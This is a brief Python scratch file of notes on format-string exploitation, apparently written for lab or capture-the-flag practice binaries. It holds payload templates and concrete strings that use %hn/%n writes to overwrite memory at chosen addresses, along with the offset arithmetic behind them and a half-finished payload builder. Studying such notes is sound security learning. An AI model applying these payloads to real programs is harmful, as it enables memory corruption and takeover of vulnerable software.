from ptrlib import *

top2bytes = ''
lower2bytes = ''
payload = "%" + top2bytes + "c%" + lower2bytes + "$hn"
print(payload)

#https://axcheron.github.io/exploit-101-format-strings/

'''
GLOBAL VARAIBLES ARE STORED IN .BSS
./format1 | grep target
'''

#Create script to autocalculate the offset

'''
You want to write 0xcafebabe
(Value we want) - (Bytes already written) = Value to set
If you want to write to
    -->address = 0xbffff6ac
    -->write 0xcafe to 0xbffff6ac+2 = 0xbffff6ae
    -->write 0xbabe to 0xbffff6ac
0xcafe = 51966
0xbabe = 47806
47806 (0xbabe) - everything before the value to write (lets say 8 theorically) --> 47798
51966 (0xcafe) - everything before it (0xbabe + 8 theory) 

EXPLOIT ANATOMY
YOU WANT TO CHANGE 0XDEADCODE TO 0XCAFEBABE

[address][address + 2]%[babe - 8]x%[index of var]$hn%[cafe - babe - 8]x%[index of var + 1]$hn
\xac\xf6\xff\xbf\xae\xf6\xff\xbf%47798x%7$hn%4160x%8$hn

\xa0\xba\x0e\x08BB%141\$n

\x5c\xf6\xff\xbf%60x%7$n

'''







#https://github.com/david942j/one_gadget
